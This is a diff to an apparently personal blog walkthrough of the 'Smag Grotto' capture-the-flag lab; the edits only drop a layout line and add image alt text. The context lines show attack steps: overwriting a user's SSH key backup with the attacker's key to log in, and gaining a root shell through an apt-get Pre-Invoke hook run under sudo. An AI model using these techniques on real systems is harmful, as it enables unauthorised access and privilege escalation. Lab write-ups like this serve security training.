@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Walkthrough - Smag Grotto
 published: true
 ---
@@ -85,7 +85,7 @@ We can generate a new key on our machine and have it overwrite jakes key.
 - ``echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDsdrf9uvgyZ3p875pK49g18bYvHFstSo09boT/9hszuygKjwHzuN4nXvTun6vDl8qESwMuydd+gmThCja4qtWtlVxHEOuZc7qYa6DbIradT7D8MZfxH0XT1L7j20HU0iox2dAE0OnSG7zD02Vww21Dti/K5G0PlhzzJ2jhjxC6N+uiVH+dcSTZ6K98OnbPxjeD2J5e/w/oyFMTPeqSe/ZU2eyyV+NnsfsTJlGHo+4vIaEyfiAY7IXrjhwjLNrXmoxWFN4l0p4fO8dGw5/KdDc+jj05nJLQZaNeAvXImh+AI+kUUdwBF40d57GXyc6RI2LJOqSiWhqfJg3YAVx73w+LPhlakryHEWgqnH7N1dzhhcXl2xPJaWzgjeKpC7apaEgOF3n6z4+83IDMj4kw/mzLrM7zj3SKeUgKiKGpzafCu2KmSKQzLPmgG0sF5QpWR7JrT9ZY4/D5gK3O8PJaxG5Y7tu9HdCUZKVqoAkJFll8qYww0tz1mlx69sLrzPTVy3s= 0xskar@cocokali" > /opt/.backups/jake_id_rsa.pub.backup``
 - and ssh in ``ssh jake@10.10.197.41 -i 0xskar``
 
-![](/assets/smag-grotto01.png)
+![0xskar](/assets/smag-grotto01.png)
 
 * * * 
 
@@ -98,7 +98,7 @@ User jake may run the following commands on smag:
 
 ``sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh``
 
-![](/assets/smag-grotto02.png)
+![0xskar](/assets/smag-grotto02.png)
 
 * * * 
 
